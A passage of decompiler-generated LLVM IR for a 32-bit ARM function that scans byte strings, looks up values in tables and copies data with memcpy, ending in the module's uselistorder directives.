  %v1_110e0 = add i32 %v0_110e0, 9
  %v2_110e0 = inttoptr i32 %v1_110e0 to i8*
  %v3_110e0 = load i8, i8* %v2_110e0, align 1
  %v4_110e0 = zext i8 %v3_110e0 to i32
  store i32 %v4_110e0, i32* %r3.global-to-local, align 4
  %v2_110e4 = icmp eq i8 %v2_110dc, 0
  %v3_110e8 = mul nuw nsw i32 %v4_110e0, 256
  store i32 %v3_110e8, i32* @ip, align 4
  br i1 %v2_110e4, label %dec_label_pc_11348, label %dec_label_pc_110f0

dec_label_pc_110f0:                               ; preds = %.thread24
  store i32 -36924, i32* %r3.global-to-local, align 4
  %v2_110f4 = add i32 %v0_11090, -36924
  store i32 %v2_110f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_110f8

dec_label_pc_110f8:                               ; preds = %dec_label_pc_1117c, %dec_label_pc_110f0
  %v1_1110c = phi i32 [ %v1_1117c, %dec_label_pc_1117c ], [ %v2_110f4, %dec_label_pc_110f0 ]
  %v1_110f8 = inttoptr i32 %v1_1110c to i8*
  %v2_110f8 = load i8, i8* %v1_110f8, align 1
  %v3_110f8 = zext i8 %v2_110f8 to i32
  store i32 %v3_110f8, i32* %r3.global-to-local, align 4
  %v9_110fc = icmp eq i8 %v2_110f8, %v2_110dc
  br i1 %v9_110fc, label %dec_label_pc_11104, label %dec_label_pc_1117c

dec_label_pc_11104:                               ; preds = %dec_label_pc_110f8
  store i32 %v2_110f4, i32* %r3.global-to-local, align 4
  %v2_1110c = sub i32 %v1_1110c, %v2_110f4
  store i32 %v2_1110c, i32* %r1.global-to-local, align 4
  %v7_11114 = icmp slt i32 %v2_1110c, 18
  br i1 %v7_11114, label %bb152, label %dec_label_pc_11118

dec_label_pc_11118:                               ; preds = %dec_label_pc_11104
  %v1_11118 = and i32 %v3_110e8, 1024
  %v2_11118 = icmp eq i32 %v1_11118, 0
  br i1 %v2_11118, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_11118
  %v2_1111c = add i32 %v2_1110c, -2
  store i32 %v2_1111c, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_11104, %dec_label_pc_11118, %bb151
  %v0_11124 = phi i32 [ %v2_1110c, %dec_label_pc_11104 ], [ %v2_1110c, %dec_label_pc_11118 ], [ %v2_1111c, %bb151 ]
  store i32 -36972, i32* %r3.global-to-local, align 4
  %v1_11124 = load i32, i32* %r7.global-to-local, align 4
  %v2_11124 = add i32 %v1_11124, 32
  %v3_11124 = inttoptr i32 %v2_11124 to i32*
  store i32 %v0_11124, i32* %v3_11124, align 4
  %v0_11128 = load i32, i32* @lr, align 4
  %v1_11128 = load i32, i32* %r3.global-to-local, align 4
  %v2_11128 = add i32 %v1_11128, %v0_11128
  store i32 %v2_11128, i32* %r3.global-to-local, align 4
  %v1_1112c = add i32 %v2_11128, -1
  store i32 %v1_1112c, i32* %r0.global-to-local, align 4
  %v0_11134.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11130

dec_label_pc_11130:                               ; preds = %dec_label_pc_11130, %bb152
  %v0_11130 = phi i32 [ %v1_11130, %dec_label_pc_11130 ], [ %v1_1112c, %bb152 ]
  %v1_11130 = add i32 %v0_11130, 1
  %v2_11130 = inttoptr i32 %v1_11130 to i8*
  %v3_11130 = load i8, i8* %v2_11130, align 1
  %v4_11130 = zext i8 %v3_11130 to i32
  store i32 %v4_11130, i32* %r3.global-to-local, align 4
  store i32 %v1_11130, i32* %r0.global-to-local, align 4
  %v8_11138 = icmp sgt i32 %v0_11134.pre, %v4_11130
  br i1 %v8_11138, label %dec_label_pc_11130, label %dec_label_pc_1113c

dec_label_pc_1113c:                               ; preds = %dec_label_pc_11130
  %v2_11144.neg = sub i32 36972, %v0_11128
  %v2_11148 = add i32 %v2_11144.neg, %v1_11130
  %v2_1114c = mul i32 %v2_11148, 2
  store i32 %v2_1114c, i32* %r2.global-to-local, align 4
  %v2_11150 = add i32 %v0_11128, -36988
  store i32 %v2_11150, i32* %r3.global-to-local, align 4
  %v2_11154 = add i32 %v2_1114c, %v2_11150
  %v3_11154 = inttoptr i32 %v2_11154 to i16*
  %v4_11154 = load i16, i16* %v3_11154, align 2
  %v6_11154 = sext i16 %v4_11154 to i32
  store i32 %v6_11154, i32* %r1.global-to-local, align 4
  %v2_1115c = add i32 %v0_11128, -37004
  store i32 %v2_1115c, i32* %r3.global-to-local, align 4
  %v2_11160 = add i32 %v2_1114c, %v2_1115c
  %v3_11160 = inttoptr i32 %v2_11160 to i16*
  %v4_11160 = load i16, i16* %v3_11160, align 2
  %v6_11160 = sext i16 %v4_11160 to i32
  %v1_11164 = load i32, i32* @ip, align 4
  %v2_11164 = or i32 %v1_11164, %v6_11154
  %v2_11168 = and i32 %v2_11164, %v6_11160
  store i32 %v2_11168, i32* %r1.global-to-local, align 4
  store i32 -36924, i32* %r3.global-to-local, align 4
  %v2_11170 = add i32 %v0_11128, -36924
  store i32 %v2_11170, i32* %r0.global-to-local, align 4
  store i32 %v2_11168, i32* %stack_var_-72, align 4
  %v0_11194.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11188

dec_label_pc_1117c:                               ; preds = %dec_label_pc_110f8
  %v1_1117c = add i32 %v1_1110c, 1
  %v2_1117c = inttoptr i32 %v1_1117c to i8*
  %v3_1117c = load i8, i8* %v2_1117c, align 1
  %v4_1117c = zext i8 %v3_1117c to i32
  store i32 %v4_1117c, i32* %r3.global-to-local, align 4
  store i32 %v1_1117c, i32* %r0.global-to-local, align 4
  %v2_11180 = icmp eq i8 %v3_1117c, 0
  br i1 %v2_11180, label %dec_label_pc_11188, label %dec_label_pc_110f8

dec_label_pc_11188:                               ; preds = %dec_label_pc_1117c, %dec_label_pc_1113c
  %v0_11194 = phi i32 [ %v0_11194.pre, %dec_label_pc_1113c ], [ %v0_110dc, %dec_label_pc_1117c ]
  %v0_11190 = phi i32 [ %v1_11164, %dec_label_pc_1113c ], [ %v3_110e8, %dec_label_pc_1117c ]
  %v0_11188 = load i32, i32* @r4, align 4
  %v1_11188 = and i32 %v0_11188, 4
  %v1_1118c = and i32 %v0_11188, -5
  store i32 %v1_1118c, i32* %r3.global-to-local, align 4
  %v1_11190 = and i32 %v0_11190, 3840
  store i32 %v1_11190, i32* %r2.global-to-local, align 4
  %v1_11194 = inttoptr i32 %v0_11194 to i8*
  %v2_11194 = load i8, i8* %v1_11194, align 1
  %v3_11194 = zext i8 %v2_11194 to i32
  store i32 %v3_11194, i32* %r1.global-to-local, align 4
  %v2_11198 = or i32 %v1_1118c, %v1_11190
  store i32 %v2_11198, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_11188, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_111a4 = load i32, i32* %r7.global-to-local, align 4
  %v2_111a4 = add i32 %v1_111a4, 20
  %v3_111a4 = inttoptr i32 %v2_111a4 to i32*
  store i32 %tmp181, i32* %v3_111a4, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_111ac = load i32, i32* %r1.global-to-local, align 4
  %v1_111ac = load i32, i32* %r7.global-to-local, align 4
  %v2_111ac = add i32 %v1_111ac, 12
  %v3_111ac = inttoptr i32 %v2_111ac to i32*
  store i32 %v0_111ac, i32* %v3_111ac, align 4
  %v0_111b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_111b0 = add i32 %v0_111b0, 4
  %v2_111b0 = inttoptr i32 %v1_111b0 to i32*
  %v3_111b0 = load i32, i32* @r5, align 4
  store i32 %v3_111b0, i32* %v2_111b0, align 4
  %v4_111b0 = add i32 %v0_111b0, 8
  %v5_111b0 = inttoptr i32 %v4_111b0 to i32*
  %v6_111b0 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_111b0, i32* %v5_111b0, align 4
  %v0_111b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_111b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_111b4 = add i32 %v1_111b4, 16
  %v3_111b4 = inttoptr i32 %v2_111b4 to i32*
  store i32 %v0_111b4, i32* %v3_111b4, align 4
  %v0_111b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_111b8 = load i32, i32* %r7.global-to-local, align 4
  %v2_111b8 = add i32 %v1_111b8, 28
  %v3_111b8 = inttoptr i32 %v2_111b8 to i32*
  store i32 %v0_111b8, i32* %v3_111b8, align 4
  %v0_111bc = load i32, i32* %r0.global-to-local, align 4
  %v1_111bc = inttoptr i32 %v0_111bc to i8*
  %v2_111bc = load i8, i8* %v1_111bc, align 1
  %v3_111bc = zext i8 %v2_111bc to i32
  store i32 %v3_111bc, i32* %r2.global-to-local, align 4
  %v2_111c0 = icmp eq i8 %v2_111bc, 0
  br i1 %v2_111c0, label %dec_label_pc_111c8, label %dec_label_pc_1124c

dec_label_pc_111c8:                               ; preds = %dec_label_pc_11188
  %v0_111c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_111c8 = inttoptr i32 %v0_111c8 to i8*
  %v2_111c8 = load i8, i8* %v1_111c8, align 1
  %v3_111c8 = zext i8 %v2_111c8 to i32
  store i32 %v3_111c8, i32* %r3.global-to-local, align 4
  %v7_111cc = icmp eq i8 %v2_111c8, 109
  br i1 %v7_111cc, label %.thread28, label %dec_label_pc_111e0

.thread28:                                        ; preds = %dec_label_pc_111c8
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_111d4 = load i32, i32* %r7.global-to-local, align 4
  %v3_111d4 = add i32 %v2_111d4, 32
  %v4_111d4 = inttoptr i32 %v3_111d4 to i32*
  store i32 20, i32* %v4_111d4, align 4
  %v1_111d8 = load i32, i32* %r2.global-to-local, align 4
  %v2_111d8 = load i32, i32* %r7.global-to-local, align 4
  %v3_111d8 = add i32 %v2_111d8, 28
  %v4_111d8 = inttoptr i32 %v3_111d8 to i32*
  store i32 %v1_111d8, i32* %v4_111d8, align 4
  br label %dec_label_pc_1124c

dec_label_pc_111e0:                               ; preds = %dec_label_pc_111c8
  store i32 2152, i32* %r3.global-to-local, align 4
  %v0_111e4 = load i32, i32* @lr, align 4
  %v2_111e4 = add i32 %v0_111e4, 2152
  %v3_111e4 = inttoptr i32 %v2_111e4 to i32*
  %v4_111e4 = load i32, i32* %v3_111e4, align 4
  store i32 %v4_111e4, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_111ec = load i32, i32* %r7.global-to-local, align 4
  %v2_111ec = add i32 %v1_111ec, 32
  %v3_111ec = inttoptr i32 %v2_111ec to i32*
  store i32 21, i32* %v3_111ec, align 4
  %v0_111f0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_111f0, i32* @ip, align 4
  %v1_111f4 = add i32 %v0_111f0, 10
  store i32 %v1_111f4, i32* %r0.global-to-local, align 4
  %v0_111fc.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_111fc = inttoptr i32 %v0_111fc.pre to i8*
  br label %dec_label_pc_111f8

dec_label_pc_111f8:                               ; preds = %dec_label_pc_1123c, %dec_label_pc_111e0
  %v1_11208 = phi i32 [ %v1_1123c, %dec_label_pc_1123c ], [ %v0_111f0, %dec_label_pc_111e0 ]
  %v1_111f8 = inttoptr i32 %v1_11208 to i8*
  %v2_111f8 = load i8, i8* %v1_111f8, align 1
  %v3_111f8 = zext i8 %v2_111f8 to i32
  store i32 %v3_111f8, i32* %r2.global-to-local, align 4
  %v2_111fc = load i8, i8* %v1_111fc, align 1
  %v3_111fc = zext i8 %v2_111fc to i32
  store i32 %v3_111fc, i32* %r3.global-to-local, align 4
  %v9_11200 = icmp eq i8 %v2_111f8, %v2_111fc
  br i1 %v9_11200, label %dec_label_pc_11208, label %dec_label_pc_1123c

dec_label_pc_11208:                               ; preds = %dec_label_pc_111f8
  %v2_11208 = sub i32 %v1_11208, %v0_111f0
  store i32 %v2_11208, i32* %r3.global-to-local, align 4
  %v0_11210 = load i32, i32* %r7.global-to-local, align 4
  %v1_11210 = add i32 %v0_11210, 4
  store i32 %v1_11210, i32* %r0.global-to-local, align 4
  %v0_11214 = load i32, i32* @lr, align 4
  %v2_11214 = add i32 %v0_11214, 27664
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_1121c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1121c, i32* %r2.global-to-local, align 4
  %v4_11220 = mul i32 %v2_11208, 4
  %v5_11220 = add i32 %v2_11214, %v4_11220
  %v6_11220 = inttoptr i32 %v5_11220 to i32*
  %v7_11220 = load i32, i32* %v6_11220, align 4
  store i32 %v7_11220, i32* @ip, align 4
  store i32 70188, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_11220)
  %v0_1122c = load i32, i32* %r0.global-to-local, align 4
  %v1_11230 = load i32, i32* %r7.global-to-local, align 4
  %v2_11230 = add i32 %v1_11230, 28
  %v3_11230 = inttoptr i32 %v2_11230 to i32*
  store i32 %v0_1122c, i32* %v3_11230, align 4
  %v7_11234 = icmp sgt i32 %v0_1122c, 5
  br i1 %v7_11234, label %dec_label_pc_11348, label %dec_label_pc_1124c

dec_label_pc_1123c:                               ; preds = %dec_label_pc_111f8
  %v1_1123c = add i32 %v1_11208, 1
  store i32 %v1_1123c, i32* %r1.global-to-local, align 4
  %v3_11240 = icmp ult i32 %v1_1123c, %v1_111f4
  br i1 %v3_11240, label %dec_label_pc_111f8, label %dec_label_pc_11348

dec_label_pc_1124c:                               ; preds = %.thread28, %dec_label_pc_11208, %dec_label_pc_11188
  %v0_1124c = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_1124c, 1
  br i1 %tmp156, label %dec_label_pc_112f8, label %dec_label_pc_11254

dec_label_pc_11254:                               ; preds = %dec_label_pc_1124c
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_1126c = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_11258

dec_label_pc_11258:                               ; preds = %dec_label_pc_112e0, %dec_label_pc_11254
  %v9_11278 = phi i32 [ 0, %dec_label_pc_11254 ], [ %v1_112e4, %dec_label_pc_112e0 ]
  %v7_1125c = icmp sgt i32 %v9_11278, 2
  br i1 %v7_1125c, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_11258
  store i32 %v9_1126c, i32* %r3.global-to-local, align 4
  %v10_11278 = add i32 %v9_11278, %v9_1126c
  store i32 %v10_11278, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_11258
  store i32 %v3_10ed4.pre-phi, i32* @ip, align 4
  %v12_11260 = mul i32 %v9_11278, 4
  %v13_11260 = add i32 %v12_11260, %v3_10ed4.pre-phi
  store i32 %v13_11260, i32* %r3.global-to-local, align 4
  %v9_11268 = add i32 %v13_11260, -12
  %v10_11268 = inttoptr i32 %v9_11268 to i8*
  %v11_11268 = load i8, i8* %v10_11268, align 4
  %v12_11268 = zext i8 %v11_11268 to i32
  store i32 %v12_11268, i32* %r2.global-to-local, align 4
  %v9_11270 = load i32, i32* %r7.global-to-local, align 4
  %v10_11270 = add i32 %v9_11270, %v9_11278
  store i32 %v10_11270, i32* %r3.global-to-local, align 4
  store i32 %v12_11268, i32* %r1.global-to-local, align 4
  %v11_1127c = add i32 %v10_11270, 36
  %v12_1127c = inttoptr i32 %v11_1127c to i8*
  store i8 %v11_11268, i8* %v12_1127c, align 1
  %v0_11280.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_112a0 = phi i32 [ %v10_11278, %.thread38 ], [ %v0_11280.pre, %bb157 ]
  %v1_11280 = load i32, i32* %fp.global-to-local, align 4
  %v2_11280 = sub i32 %v0_112a0, %v1_11280
  %v4_11280 = xor i32 %v1_11280, %v0_112a0
  %v5_11280 = xor i32 %v2_11280, %v0_112a0
  %v6_11280 = and i32 %v5_11280, %v4_11280
  %v7_11280 = icmp slt i32 %v6_11280, 0
  %v8_11280 = icmp slt i32 %v2_11280, 0
  %v9_11280 = icmp eq i32 %v0_112a0, %v1_11280
  %v3_11284 = xor i1 %v8_11280, %v7_11280
  %v4_11284 = or i1 %v9_11280, %v3_11284
  br i1 %v4_11284, label %dec_label_pc_11294, label %dec_label_pc_11288

dec_label_pc_11288:                               ; preds = %bb158
  %v1_11288 = add i32 %v0_112a0, -9
  %v3_11288 = sub i32 8, %v0_112a0
  %v4_11288 = and i32 %v3_11288, %v0_112a0
  %v5_11288 = icmp slt i32 %v4_11288, 0
  %v6_11288 = icmp slt i32 %v1_11288, 0
  %v7_11288 = icmp eq i32 %v0_112a0, 9
  %v3_1128c = xor i1 %v6_11288, %v5_11288
  %v4_1128c = or i1 %v7_11288, %v3_1128c
  br i1 %v4_1128c, label %dec_label_pc_11290, label %dec_label_pc_11348

dec_label_pc_11290:                               ; preds = %dec_label_pc_11288
  store i32 %v0_112a0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11294

dec_label_pc_11294:                               ; preds = %bb158, %dec_label_pc_11290
  store i32 %v3_10ed4.pre-phi, i32* @r2, align 4
  %v1_11298 = load i32, i32* %r8.global-to-local, align 4
  %v4_11298 = mul i32 %v1_11298, 4
  %v5_11298 = add i32 %v4_11298, %v3_10ed4.pre-phi
  store i32 %v5_11298, i32* %sb.global-to-local, align 4
  %v1_1129c = add i32 %v5_11298, -40
  %v2_1129c = inttoptr i32 %v1_1129c to i32*
  %v3_1129c = load i32, i32* %v2_1129c, align 4
  store i32 %v3_1129c, i32* %r5.global-to-local, align 4
  %v1_112a0 = add i32 %v0_112a0, -1
  store i32 %v1_112a0, i32* %r3.global-to-local, align 4
  %v0_112a4 = load i32, i32* %r7.global-to-local, align 4
  %v4_112a4 = mul i32 %v1_112a0, 4
  %v5_112a4 = add i32 %v0_112a4, %v4_112a4
  store i32 %v5_112a4, i32* %sl.global-to-local, align 4
  %v7_112a8 = icmp eq i32 %v3_1129c, 8
  %v1_112ac = add i32 %v5_112a4, 40
  %v2_112ac = inttoptr i32 %v1_112ac to i32*
  %v3_112ac = load i32, i32* %v2_112ac, align 4
  store i32 %v3_112ac, i32* @r0, align 4
  br i1 %v7_112a8, label %dec_label_pc_112e0, label %dec_label_pc_112b4

dec_label_pc_112b4:                               ; preds = %dec_label_pc_11294
  %v9_112b4 = icmp eq i32 %v3_112ac, %v3_1129c
  br i1 %v9_112b4, label %dec_label_pc_112d8, label %bb159

bb159:                                            ; preds = %dec_label_pc_112b4
  %v8_112b8 = icmp eq i32 %v3_112ac, 8
  br i1 %v8_112b8, label %dec_label_pc_112d8, label %dec_label_pc_112c0

dec_label_pc_112c0:                               ; preds = %bb159
  %v0_112c0 = call i32 @_promoted_size()
  %v0_112c8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_112c8, i32* @r0, align 4
  %v0_112cc = call i32 @_promoted_size()
  store i32 %v0_112cc, i32* %r0.global-to-local, align 4
  %v8_112d4 = icmp sgt i32 %v0_112c0, %v0_112cc
  br i1 %v8_112d4, label %dec_label_pc_112e0, label %dec_label_pc_112c0.dec_label_pc_112d8_crit_edge

dec_label_pc_112c0.dec_label_pc_112d8_crit_edge:  ; preds = %dec_label_pc_112c0
  %v0_112d8.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_112dc.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_112d8

dec_label_pc_112d8:                               ; preds = %dec_label_pc_112c0.dec_label_pc_112d8_crit_edge, %dec_label_pc_112b4, %bb159
  %v1_112dc = phi i32 [ %v1_112dc.pre, %dec_label_pc_112c0.dec_label_pc_112d8_crit_edge ], [ %v5_112a4, %dec_label_pc_112b4 ], [ %v5_112a4, %bb159 ]
  %v0_112d8 = phi i32 [ %v0_112d8.pre, %dec_label_pc_112c0.dec_label_pc_112d8_crit_edge ], [ %v5_11298, %dec_label_pc_112b4 ], [ %v5_11298, %bb159 ]
  %v1_112d8 = add i32 %v0_112d8, -40
  %v2_112d8 = inttoptr i32 %v1_112d8 to i32*
  %v3_112d8 = load i32, i32* %v2_112d8, align 4
  store i32 %v3_112d8, i32* %r3.global-to-local, align 4
  %v2_112dc = add i32 %v1_112dc, 40
  %v3_112dc = inttoptr i32 %v2_112dc to i32*
  store i32 %v3_112d8, i32* %v3_112dc, align 4
  br label %dec_label_pc_112e0

dec_label_pc_112e0:                               ; preds = %dec_label_pc_112c0, %dec_label_pc_11294, %dec_label_pc_112d8
  %v0_112e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_112e0 = add i32 %v0_112e0, 28
  %v2_112e0 = inttoptr i32 %v1_112e0 to i32*
  %v3_112e0 = load i32, i32* %v2_112e0, align 4
  %v0_112e4 = load i32, i32* %r8.global-to-local, align 4
  %v1_112e4 = add i32 %v0_112e4, 1
  store i32 %v1_112e4, i32* %r8.global-to-local, align 4
  %v1_112e8 = add i32 %v3_112e0, 2
  store i32 %v1_112e8, i32* %r3.global-to-local, align 4
  %v6_112f0 = icmp slt i32 %v1_112e4, %v1_112e8
  br i1 %v6_112f0, label %dec_label_pc_11258, label %dec_label_pc_11314

dec_label_pc_112f8:                               ; preds = %dec_label_pc_1124c
  %v0_112f8 = load i32, i32* %r7.global-to-local, align 4
  %v1_112f8 = add i32 %v0_112f8, 28
  %v2_112f8 = inttoptr i32 %v1_112f8 to i32*
  %v3_112f8 = load i32, i32* %v2_112f8, align 4
  store i32 %v3_112f8, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_11300 = add i32 %v0_112f8, 38
  %v4_11300 = inttoptr i32 %v3_11300 to i8*
  store i8 1, i8* %v4_11300, align 1
  %v0_11304 = load i32, i32* %r2.global-to-local, align 4
  %v3_11304 = mul i32 %v0_11304, 4
  store i32 %v3_11304, i32* @r2, align 4
  %v0_11308 = load i32, i32* %r7.global-to-local, align 4
  %v1_11308 = add i32 %v0_11308, 40
  store i32 %v1_11308, i32* @r0, align 4
  %v2_1130c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1130c, i32* @r1, align 4
  %v0_11310 = call i32 @memcpy()
  store i32 %v0_11310, i32* %r0.global-to-local, align 4
  %v0_11314.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11314

dec_label_pc_11314:                               ; preds = %dec_label_pc_112e0, %dec_label_pc_112f8
  %v2_11330 = phi i32 [ %v0_11314.pre, %dec_label_pc_112f8 ], [ %v0_112e0, %dec_label_pc_112e0 ]
  %v1_11314 = add i32 %v2_11330, 16
  %v2_11314 = inttoptr i32 %v1_11314 to i32*
  %v3_11314 = load i32, i32* %v2_11314, align 4
  store i32 %v3_11314, i32* %r3.global-to-local, align 4
  %v1_11318 = and i32 %v3_11314, 128
  %v2_11318 = icmp eq i32 %v1_11318, 0
  br i1 %v2_11318, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_11314
  %v3_1131c = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_1131c, i32* %r3.global-to-local, align 4
  %v2_11320 = inttoptr i32 %v2_11330 to i32*
  %v3_11320 = load i32, i32* %v2_11320, align 4
  %v2_11328.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_11328 = sub i32 %v2_11328.pre, %v3_1131c
  store i32 %v3_11328, i32* %r3.global-to-local, align 4
  %v5_1132c = mul i32 %v3_11328, 4
  %v6_1132c = add i32 %v5_1132c, %v3_11320
  store i32 %v6_1132c, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_11314
  %v1_1132445 = load i32, i32* %r6.global-to-local, align 4
  %v2_1132446 = add i32 %v1_1132445, 1
  store i32 %v2_1132446, i32* %r3.global-to-local, align 4
  %v3_11330 = inttoptr i32 %v2_11330 to i32*
  store i32 %v2_1132446, i32* %v3_11330, align 4
  %v0_11334.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_1133c = phi i32 [ %v2_11330, %.thread48 ], [ %v0_11334.pre, %.thread50 ]
  %v1_11334 = add i32 %v1_1133c, 28
  %v2_11334 = inttoptr i32 %v1_11334 to i32*
  %v3_11334 = load i32, i32* %v2_11334, align 4
  store i32 %v3_11334, i32* %r3.global-to-local, align 4
  %v1_11338 = add i32 %v3_11334, 2
  store i32 %v1_11338, i32* %r0.global-to-local, align 4
  %v0_1133c = load i32, i32* %fp.global-to-local, align 4
  %v2_1133c = add i32 %v1_1133c, 24
  %v3_1133c = inttoptr i32 %v2_1133c to i32*
  store i32 %v0_1133c, i32* %v3_1133c, align 4
  br i1 %v2_11318, label %dec_label_pc_1134c, label %bb161

bb161:                                            ; preds = %bb160
  %v1_11340 = load i32, i32* @r2, align 4
  %v2_11340 = load i32, i32* %r7.global-to-local, align 4
  %v3_11340 = inttoptr i32 %v2_11340 to i32*
  store i32 %v1_11340, i32* %v3_11340, align 4
  br label %dec_label_pc_1134c

dec_label_pc_11348:                               ; preds = %dec_label_pc_1123c, %dec_label_pc_10e5c, %dec_label_pc_10fa4, %dec_label_pc_11050, %dec_label_pc_11028, %dec_label_pc_11034, %dec_label_pc_10f70, %dec_label_pc_11288, %dec_label_pc_11208, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1134c

dec_label_pc_1134c:                               ; preds = %bb161, %bb160, %dec_label_pc_11348
  %v2_11350 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11350, i32* @r4, align 4
  store i32 %v6_10e18, i32* @r5, align 4
  store i32 %v27_10e18, i32* @lr, align 4
  %v1_11354 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_11354

; uselistorder directives
  uselistorder i32 %v3_11328, { 1, 0 }
  uselistorder i32 %v1_112e4, { 1, 2, 0 }
  uselistorder i32 %v2_11280, { 1, 0 }
  uselistorder i32 %v1_11280, { 1, 0, 2 }
  uselistorder i32 %v0_112a0, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_11278, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1123c, { 1, 2, 0 }
  uselistorder i32 %v0_1122c, { 1, 0 }
  uselistorder i32 %v1_11208, { 1, 0, 2 }
  uselistorder i32 %v1_1117c, { 1, 2, 0 }
  uselistorder i32 %v1_11164, { 1, 0 }
  uselistorder i32 %v2_1114c, { 2, 1, 0 }
  uselistorder i32 %v1_11130, { 0, 2, 3, 1 }
  uselistorder i32 %v0_11128, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_1110c, { 1, 0, 2 }
  uselistorder i32 %v2_110f4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_110e8, { 2, 1, 0 }
  uselistorder i32 %v1_110a8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_11098.pre, { 0, 2, 1 }
  uselistorder i32 %v2_11074, { 1, 0 }
  uselistorder i32 %v5_10fd4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10fd4, { 1, 0 }
  uselistorder i32 %v0_10fd876, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_10f7c, { 1, 0 }
  uselistorder i32 %v0_10f9c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_10f60, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10f48, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_10f38, { 1, 0 }
  uselistorder i32 %v3_10f30, { 0, 2, 1 }
  uselistorder i8 %v2_10f30, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10fb0, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_10ef4, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10ee0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10ec8, { 1, 0 }
  uselistorder i32 %v3_10ed4.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_10e7c, { 0, 2, 1 }
  uselistorder i32 %v2_10e68, { 1, 0, 2 }
  uselistorder i32 %v0_10e1c, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 0, 19, 18, 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20 }
  uselistorder i32* %r6.global-to-local, { 15, 14, 13, 11, 9, 2, 3, 10, 4, 12, 5, 6, 7, 8, 0, 1, 16 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 52, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 18, 47, 50, 51, 48, 49, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
